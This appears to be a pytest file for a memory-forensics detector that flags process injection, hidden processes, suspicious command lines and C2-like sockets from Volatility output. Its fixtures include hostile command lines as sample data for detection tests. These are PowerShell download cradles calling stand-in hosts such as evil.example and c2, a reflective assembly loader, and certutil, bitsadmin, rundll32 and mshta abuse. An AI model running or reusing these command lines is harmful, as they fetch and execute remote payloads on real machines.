"""Tests for MemoryDetector.

The detector consumes already-parsed Volatility rows — we never invoke
Volatility here. That keeps tests fast and independent of which exact
Vol3 version is installed.
"""

from __future__ import annotations

import base64

from sift_find_evil.detectors.memory_detector import MemoryDetector
from sift_find_evil.findings import FindingCategory
from sift_find_evil.memory.volatility_runner import (
    CommandLineRow,
    InjectionRow,
    NetworkRow,
    ProcessRow,
)


def _ps_encode(cmd: str) -> str:
    """Mimic `powershell -EncodedCommand`: UTF-16LE + base64."""
    return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")


# -- fixture helpers -------------------------------------------------------


def _proc(
    pid: int, name: str, *, ppid: int = 4, exit_time: str | None = None
) -> ProcessRow:
    return ProcessRow(
        pid=pid,
        ppid=ppid,
        name=name,
        create_time="2024-01-01T00:00:00",
        exit_time=exit_time,
        raw_row={},
    )


def _malfind_row(
    pid: int,
    *,
    protection: str = "PAGE_EXECUTE_READWRITE",
    process: str = "evil.exe",
) -> InjectionRow:
    return InjectionRow(
        pid=pid,
        process=process,
        start_vpn=100,
        end_vpn=200,
        tag="VadS",
        protection=protection,
        commit_charge=1,
        private_memory=1,
        file_output="Disabled",
        hexdump="MZ...",
        raw_row={},
    )


def _cmdline_row(pid: int, process: str, args: str) -> CommandLineRow:
    return CommandLineRow(pid=pid, process=process, args=args, raw_row={})


def _netscan_row(
    *,
    pid: int | None = 1234,
    owner: str | None = "evil.exe",
    protocol: str = "TCPv4",
    local_addr: str | None = "10.0.0.5",
    local_port: int | None = 49152,
    foreign_addr: str | None = "1.2.3.4",
    foreign_port: int | None = 443,
    state: str | None = "ESTABLISHED",
) -> NetworkRow:
    return NetworkRow(
        pid=pid,
        owner=owner,
        protocol=protocol,
        local_addr=local_addr,
        local_port=local_port,
        foreign_addr=foreign_addr,
        foreign_port=foreign_port,
        state=state,
        raw_row={},
    )


# -- malfind / process injection -------------------------------------------


def test_malfind_rwx_emits_process_injection_finding() -> None:
    findings = MemoryDetector().analyze(malfind=[_malfind_row(1234)])
    assert len(findings) == 1
    assert findings[0].category == FindingCategory.PROCESS_INJECTION
    assert findings[0].evidence["pid"] == 1234
    assert "T1055" in findings[0].evidence["mitre_attack"]


def test_malfind_writecopy_also_counts() -> None:
    """PAGE_EXECUTE_WRITECOPY is the other RWX variant Volatility emits."""
    row = _malfind_row(1234, protection="PAGE_EXECUTE_WRITECOPY")
    findings = MemoryDetector().analyze(malfind=[row])
    assert len(findings) == 1


def test_malfind_read_only_does_not_fire() -> None:
    """Non-RWX regions are noise; skip them."""
    row = _malfind_row(1234, protection="PAGE_EXECUTE_READ")
    findings = MemoryDetector().analyze(malfind=[row])
    assert findings == []


def test_malfind_handles_missing_protection_gracefully() -> None:
    row = InjectionRow(
        pid=1234,
        process="evil.exe",
        start_vpn=0,
        end_vpn=0,
        tag=None,
        protection=None,
        commit_charge=None,
        private_memory=None,
        file_output=None,
        hexdump=None,
        raw_row={},
    )
    assert MemoryDetector().analyze(malfind=[row]) == []


# -- pslist / psscan divergence --------------------------------------------


def test_hidden_process_detected_via_psscan_without_pslist() -> None:
    pslist = [_proc(1, "System"), _proc(1234, "explorer.exe")]
    psscan = [
        _proc(1, "System"),
        _proc(1234, "explorer.exe"),
        _proc(9999, "rootkit.exe"),
    ]
    findings = MemoryDetector().analyze(pslist=pslist, psscan=psscan)
    assert len(findings) == 1
    assert findings[0].evidence["pid"] == 9999
    assert findings[0].category == FindingCategory.PROCESS_INJECTION
    # DKOM (unlinking from PsActiveProcessHead) is T1014 (Rootkit), not
    # T1620 (Reflective Code Loading). See SFE-tun review.
    assert "T1014" in findings[0].evidence["mitre_attack"]


def test_system_idle_pids_whitelisted() -> None:
    """PIDs 0 (System Idle) and 4 (System) routinely desync across dumps."""
    pslist = [_proc(1234, "explorer.exe")]
    psscan = [
        _proc(0, "System Idle Process"),
        _proc(4, "System"),
        _proc(1234, "explorer.exe"),
    ]
    findings = MemoryDetector().analyze(pslist=pslist, psscan=psscan)
    assert findings == []


def test_exited_processes_skipped() -> None:
    """A process that already exited legitimately shows up in psscan
    but not pslist. Skip it to avoid flooding with benign terminations."""
    pslist = [_proc(1234, "cmd.exe")]
    psscan = [
        _proc(1234, "cmd.exe"),
        _proc(5555, "terminated.exe", exit_time="2024-01-01T00:00:05"),
    ]
    findings = MemoryDetector().analyze(pslist=pslist, psscan=psscan)
    assert findings == []


def test_hidden_process_requires_both_streams() -> None:
    """No pslist -> we can't compute divergence at all; no findings."""
    psscan = [_proc(9999, "rootkit.exe")]
    findings = MemoryDetector().analyze(psscan=psscan)
    assert findings == []


# -- cmdline (LOLBAS + hidden flags) ---------------------------------------


def test_cmdline_powershell_with_hidden_flags_fires_high() -> None:
    row = _cmdline_row(
        1234,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell -nop -w hidden -enc aGVsbG8=",
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    assert len(findings) == 1
    f = findings[0]
    assert f.category == FindingCategory.PERSISTENCE
    assert f.severity == "high"
    assert f.confidence >= 0.80
    # Normalized basename appears in reasons.
    assert any("powershell.exe" in r for r in f.evidence["reasons"])


def test_cmdline_lolbas_alone_fires_low() -> None:
    """LOLBAS host without hidden flags is generic — admin scripts do
    this. Fire medium/low to keep it visible but not alarming."""
    row = _cmdline_row(1234, "powershell.exe", "powershell Get-Process")
    findings = MemoryDetector().analyze(cmdline=[row])
    assert len(findings) == 1
    assert findings[0].severity == "medium"
    assert findings[0].confidence < 0.80


def test_cmdline_hidden_flags_alone_fires() -> None:
    """Encoded-command flags even from a non-LOLBAS host should trip."""
    row = _cmdline_row(1234, "notmalware.exe", "arg -enc aGVsbG8=")
    findings = MemoryDetector().analyze(cmdline=[row])
    assert len(findings) == 1
    assert findings[0].severity == "medium"  # single reason only


def test_cmdline_benign_process_no_finding() -> None:
    row = _cmdline_row(1234, "notepad.exe", "notepad C:\\Users\\Alice\\notes.txt")
    findings = MemoryDetector().analyze(cmdline=[row])
    assert findings == []


def test_cmdline_null_args_skipped() -> None:
    """Some processes expose a CmdLine row but have no Args field
    (system / kernel-side). Skip rather than crash on None."""
    row = CommandLineRow(pid=4, process="System", args=None, raw_row={})
    findings = MemoryDetector().analyze(cmdline=[row])
    assert findings == []


# -- cmdline T1140 (Deobfuscate/Decode) -----------------------------------


def test_cmdline_encoded_command_decodes_and_fires_high() -> None:
    """`-EncodedCommand <utf16le-base64>` is the canonical T1140 shape
    for PowerShell. We must decode it and surface the decoded payload."""
    payload = (
        'IEX(New-Object Net.WebClient).DownloadString("http://evil.example/a.ps1")'
    )
    encoded = _ps_encode(payload)
    row = _cmdline_row(
        1234,
        "powershell.exe",
        f"powershell -nop -w hidden -EncodedCommand {encoded}",
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    # One LOLBAS+hidden cmdline finding AND one T1140 deobfuscation finding.
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1
    f = t1140[0]
    assert f.category == FindingCategory.PROCESS_INJECTION
    assert f.severity == "high"
    assert f.confidence >= 0.80
    assert "DownloadString" in f.evidence["decoded_payload"]
    assert "http://evil.example/a.ps1" in f.evidence["decoded_payload"]
    assert "T1027" in f.evidence["mitre_attack"]
    # T1059 or its PowerShell sub-technique T1059.001 — either is valid.
    assert any(t.startswith("T1059") for t in f.evidence["mitre_attack"])


def test_cmdline_short_enc_flag_also_decodes() -> None:
    """PowerShell accepts `-enc` as the short form of `-EncodedCommand`."""
    payload = "FromBase64String('AAAA'); IEX $x"
    encoded = _ps_encode(payload)
    row = _cmdline_row(
        1234,
        "powershell.exe",
        f"powershell -enc {encoded}",
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1
    assert "FromBase64String" in t1140[0].evidence["decoded_payload"]


def test_cmdline_invalid_base64_after_enc_does_not_crash() -> None:
    """Malformed payload after -enc must fall back to the legacy cmdline
    finding without crashing or adding a bogus T1140 finding."""
    row = _cmdline_row(
        1234,
        "powershell.exe",
        "powershell -EncodedCommand !!!not-valid-base64!!!",
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    # Still get the legacy LOLBAS + hidden-flag finding.
    assert len(findings) >= 1
    # But no T1140 finding, since we couldn't decode anything.
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert t1140 == []


def test_cmdline_certutil_decode_fires_without_enc() -> None:
    """`certutil -decode` is a LOLBAS deobfuscation primitive and should
    fire T1140 regardless of -enc presence. Severity stays medium when
    unaccompanied by a decoded stage-one marker, because certutil has
    legitimate (rare but real) admin use."""
    row = _cmdline_row(
        1234,
        "certutil.exe",
        "certutil -decode C:\\Users\\Public\\payload.b64 C:\\Users\\Public\\payload.exe",
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1
    assert t1140[0].severity == "medium"
    reasons = " ".join(t1140[0].evidence.get("reasons", []))
    assert "certutil" in reasons.lower()


def test_cmdline_bitsadmin_transfer_stays_medium() -> None:
    """bitsadmin /transfer is commonly abused but also legitimately used
    for patching. Without other signals, stay medium."""
    row = _cmdline_row(
        1234,
        "bitsadmin.exe",
        "bitsadmin /transfer myJob http://evil/a.exe C:\\Temp\\a.exe",
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1
    assert t1140[0].severity == "medium"


def test_cmdline_rundll32_javascript_fires() -> None:
    """`rundll32 javascript:...` is the canonical squiblydoo/squiblytwo
    pattern — classic T1218/T1140 combo. No legitimate use -> high."""
    row = _cmdline_row(
        1234,
        "rundll32.exe",
        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1);',
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1
    assert t1140[0].severity == "high"


def test_cmdline_iex_downloadstring_plaintext_fires_high() -> None:
    """Stage-one loader: `IEX (New-Object Net.WebClient).DownloadString(url)`
    is the single most common PowerShell download-cradle and should
    surface high severity even without any encoding."""
    row = _cmdline_row(
        1234,
        "powershell.exe",
        'powershell IEX(New-Object Net.WebClient).DownloadString("http://evil/a")',
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1
    assert t1140[0].severity == "high"


def test_cmdline_high_entropy_decoded_payload_bumps_severity() -> None:
    """A decoded payload with Shannon entropy > threshold AND second-stage
    markers (IEX + DownloadString + url) should be high severity."""
    # Craft something that decodes to shellcode-adjacent markers.
    payload = (
        "$b=[Convert]::FromBase64String('AAAA'); "
        '[Reflection.Assembly]::Load($b); IEX((New-Object Net.WebClient).DownloadString("http://c2/x"))'
    )
    encoded = _ps_encode(payload)
    row = _cmdline_row(
        1234,
        "powershell.exe",
        f"powershell -nop -enc {encoded}",
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1
    assert t1140[0].severity == "high"
    reasons = " ".join(t1140[0].evidence.get("reasons", []))
    assert "Reflection.Assembly" in reasons or "reflection" in reasons.lower()


def test_cmdline_decoded_payload_truncated() -> None:
    """Huge decoded payloads must be truncated in evidence to avoid
    memory blowups during JSON serialization."""
    huge = "X" * 100_000
    encoded = _ps_encode(huge)
    row = _cmdline_row(
        1234,
        "powershell.exe",
        f"powershell -enc {encoded}",
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1
    # Decoded payload stored in evidence is truncated to _MAX_COMMAND_LENGTH.
    assert len(t1140[0].evidence["decoded_payload"]) <= 8192


def test_cmdline_plain_benign_powershell_does_not_fire_t1140() -> None:
    """A benign `Get-Process` call must not get a T1140 tag just because
    powershell is LOLBAS. T1140 requires a decoding/deobfuscation signal."""
    row = _cmdline_row(1234, "powershell.exe", "powershell Get-Process")
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert t1140 == []


def test_cmdline_mshta_vbscript_fires() -> None:
    """`mshta vbscript:...` is a classic script-host abuse vector that
    T1140 detection should catch."""
    row = _cmdline_row(
        1234,
        "mshta.exe",
        'mshta vbscript:CreateObject("Wscript.Shell").Run("cmd /c calc")',
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1


def test_cmdline_bitsadmin_transfer_fires() -> None:
    """`bitsadmin /transfer` is a download-cradle alternative that should
    land under T1140/T1105."""
    row = _cmdline_row(
        1234,
        "bitsadmin.exe",
        "bitsadmin /transfer myJob http://evil/a.exe C:\\Temp\\a.exe",
    )
    findings = MemoryDetector().analyze(cmdline=[row])
    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
    assert len(t1140) == 1


# -- netscan (suspicious sockets) -----------------------------------------


def test_netscan_lolbas_with_external_connection_fires() -> None:
    """A LOLBAS host (powershell.exe) with an ESTABLISHED connection to a
    routable foreign IP is the canonical reverse-shell / C2 signal."""
    row = _netscan_row(
        owner="powershell.exe",
        foreign_addr="203.0.113.45",
        foreign_port=4444,
    )
    findings = MemoryDetector().analyze(netscan=[row])
    assert len(findings) == 1
    f = findings[0]
    assert f.category == FindingCategory.DATA_EXFILTRATION
    assert f.severity == "high"
    # Two reasons (LOLBAS + reverse-shell port) -> high confidence.
    assert f.confidence >= 0.80
    assert "T1071" in f.evidence["mitre_attack"]
    assert f.evidence["pid"] == 1234


def test_netscan_lolbas_to_rfc1918_flags_lateral_movement() -> None:
    """LOLBAS reaching an internal address (10/8, 172.16/12, 192.168/16)
    is a lateral-movement signal, not exfiltration."""
    row = _netscan_row(
        owner="cmd.exe",
        foreign_addr="10.0.0.50",
        foreign_port=445,
    )
    findings = MemoryDetector().analyze(netscan=[row])
    assert len(findings) == 1
    assert findings[0].category == FindingCategory.LATERAL_MOVEMENT
    assert "T1021" in findings[0].evidence["mitre_attack"]


def test_netscan_unowned_socket_fires_hidden() -> None:
    """Sockets with no owning PID (kernel-side / unlinked) are a rootkit
    adjunct — the process was hidden or killed before snapshot."""
    row = _netscan_row(pid=None, owner=None, foreign_addr="198.51.100.7")
    findings = MemoryDetector().analyze(netscan=[row])
    assert len(findings) == 1
    assert findings[0].category == FindingCategory.PROCESS_INJECTION
    assert "T1014" in findings[0].evidence["mitre_attack"]


def test_netscan_benign_chrome_does_not_fire() -> None:
    """A browser talking HTTPS is noise — don't flag every outbound 443."""
    row = _netscan_row(
        owner="chrome.exe",
        foreign_addr="142.250.72.46",
        foreign_port=443,
    )
    findings = MemoryDetector().analyze(netscan=[row])
    assert findings == []


def test_netscan_lolbas_on_standard_https_fires_low() -> None:
    """A LOLBAS host (powershell.exe) on 443 to an external IP is a
    single-reason match — suspicious enough to surface but not
    escalation-worthy on its own."""
    row = _netscan_row(
        owner="powershell.exe",
        foreign_addr="203.0.113.10",
        foreign_port=443,
    )
    findings = MemoryDetector().analyze(netscan=[row])
    assert len(findings) == 1
    assert findings[0].severity == "medium"
    assert findings[0].confidence < 0.80


def test_netscan_listening_state_skipped_when_no_foreign_addr() -> None:
    """LISTENING sockets have no foreign address — they're servers
    waiting for inbound traffic, not outbound connections. Skip them
    to keep finding counts manageable."""
    row = _netscan_row(
        owner="powershell.exe",
        foreign_addr=None,
        foreign_port=None,
        state="LISTENING",
    )
    findings = MemoryDetector().analyze(netscan=[row])
    assert findings == []


def test_netscan_loopback_ignored() -> None:
    """127.0.0.0/8 connections never leave the host; they're IPC, not
    exfil or lateral movement."""
    row = _netscan_row(owner="powershell.exe", foreign_addr="127.0.0.1")
    findings = MemoryDetector().analyze(netscan=[row])
    assert findings == []


def test_netscan_ipv6_skipped_until_policy() -> None:
    """IPv6 ULA / link-local / public-v6 policy is unset. Skip rather
    than mis-classify fc00::/7 as external exfiltration. SFE-35e will
    revisit once Linux plugin coverage brings v6 fixtures."""
    for addr in ("fc00::1", "fe80::dead:beef", "2001:db8::1"):
        row = _netscan_row(owner="powershell.exe", foreign_addr=addr)
        findings = MemoryDetector().analyze(netscan=[row])
        assert findings == [], f"IPv6 {addr} should be skipped"


def test_netscan_half_dead_states_skipped() -> None:
    """Torn-down TCP states (CLOSE_WAIT, TIME_WAIT, FIN_WAIT*) represent
    connections no longer carrying traffic. Skip to avoid double-counting
    against the ESTABLISHED half of the same conversation."""
    for state in (
        "CLOSE_WAIT",
        "TIME_WAIT",
        "FIN_WAIT1",
        "FIN_WAIT2",
        "CLOSING",
        "LAST_ACK",
    ):
        row = _netscan_row(
            owner="powershell.exe",
            foreign_addr="203.0.113.50",
            foreign_port=4444,
            state=state,
        )
        findings = MemoryDetector().analyze(netscan=[row])
        assert findings == [], f"state={state} should be skipped"


def test_netscan_port_zero_fires_low_confidence() -> None:
    """Port 0 / None coalesces to 0; still a LOLBAS-holding-external-
    socket signal, just not on a known reverse-shell port."""
    row = _netscan_row(
        owner="powershell.exe",
        foreign_addr="203.0.113.10",
        foreign_port=None,
    )
    findings = MemoryDetector().analyze(netscan=[row])
    assert len(findings) == 1
    assert findings[0].confidence == 0.55
    assert findings[0].severity == "medium"


def test_netscan_lm_finding_mentions_admin_false_positive() -> None:
    """Lateral-movement reasoning chain must call out legitimate remote
    admin (PSRemoting, RDP) as a false-positive surface so triage does
    not treat every 0.80 hit as confirmed pivot."""
    row = _netscan_row(
        owner="powershell.exe",
        foreign_addr="10.0.0.50",
        foreign_port=5985,
    )
    findings = MemoryDetector().analyze(netscan=[row])
    assert len(findings) == 1
    chain = " ".join(findings[0].reasoning_chain).lower()
    assert "psremoting" in chain or "remote administration" in chain


# -- multi-stream integration ---------------------------------------------


def test_analyze_aggregates_across_streams() -> None:
    pslist = [_proc(1234, "explorer.exe")]
    psscan = [_proc(1234, "explorer.exe"), _proc(9999, "rootkit.exe")]
    malfind = [_malfind_row(1234)]
    cmdline = [_cmdline_row(1234, "powershell.exe", "powershell -enc aGk=")]
    netscan = [
        _netscan_row(
            owner="powershell.exe", foreign_addr="203.0.113.9", foreign_port=4444
        )
    ]

    findings = MemoryDetector().analyze(
        pslist=pslist,
        psscan=psscan,
        malfind=malfind,
        cmdline=cmdline,
        netscan=netscan,
    )

    # Four unique findings: malfind RWX, hidden process, cmdline, netscan.
    assert len(findings) == 4
    categories = {f.category for f in findings}
    assert FindingCategory.PROCESS_INJECTION in categories
    assert FindingCategory.PERSISTENCE in categories
    assert FindingCategory.DATA_EXFILTRATION in categories


def test_analyze_with_no_streams_returns_empty() -> None:
    assert MemoryDetector().analyze() == []
